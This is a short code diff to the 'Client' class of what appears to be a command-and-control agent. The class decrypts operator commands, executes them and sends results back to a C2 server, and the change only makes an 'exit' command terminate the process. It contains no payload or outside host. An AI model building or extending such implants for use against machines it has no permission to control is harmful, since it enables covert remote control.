@@ -35,7 +35,7 @@ class Client:
     def execute_command(self, command_body):
         self.command = Criptographer.decrypt(command_body, self.username).strip()
         if self.command is None or self.command.lower() == "exit":
-            return
+            raise SystemExit(0) 
         
         self.result = self.execute()
         self.send_result_to_c2()
